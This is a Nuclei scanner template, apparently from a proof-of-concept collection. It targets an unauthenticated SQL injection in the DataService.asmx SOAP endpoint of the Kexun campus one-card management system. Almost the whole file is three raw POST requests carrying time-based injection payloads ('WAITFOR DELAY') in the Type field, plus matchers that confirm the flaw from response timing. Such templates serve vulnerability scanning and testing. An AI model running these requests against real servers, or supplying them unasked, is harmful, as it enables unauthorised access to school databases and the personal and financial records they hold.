pocs/nuclei/kxykt-DataService-sqli.yaml

id: kxykt-DataService-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 科讯校园一卡通管理系统DataService.asmx存在SQL注入漏洞，未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%A7%91%E8%AE%AF%E4%B8%80%E5%8D%A1%E9%80%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDataService.asmx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |
        POST /DataService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/ExeAppCmd"
        Connection: Keep-Alive

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <ExeAppCmd xmlns="http://tempuri.org/">
              <str>{"cmd":"get_sb_guanli","Type":"1');WAITFOR DELAY '0:0:3'--"}</str>
              <files>MTIz</files>
            </ExeAppCmd>
          </soap:Body>
        </soap:Envelope>
      - |
        POST /DataService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/ExeAppCmd"
        Connection: Keep-Alive

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <ExeAppCmd xmlns="http://tempuri.org/">
              <str>{"cmd":"get_sb_guanli","Type":"1');WAITFOR DELAY '0:0:6'--"}</str>
              <files>MTIz</files>
            </ExeAppCmd>
          </soap:Body>
        </soap:Envelope>
      - |
        POST /DataService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/ExeAppCmd"
        Connection: Keep-Alive

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <ExeAppCmd xmlns="http://tempuri.org/">
              <str>{"cmd":"get_sb_guanli","Type":"1');WAITFOR DELAY '0:0:9'--"}</str>
              <files>MTIz</files>
            </ExeAppCmd>
          </soap:Body>
        </soap:Envelope>
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"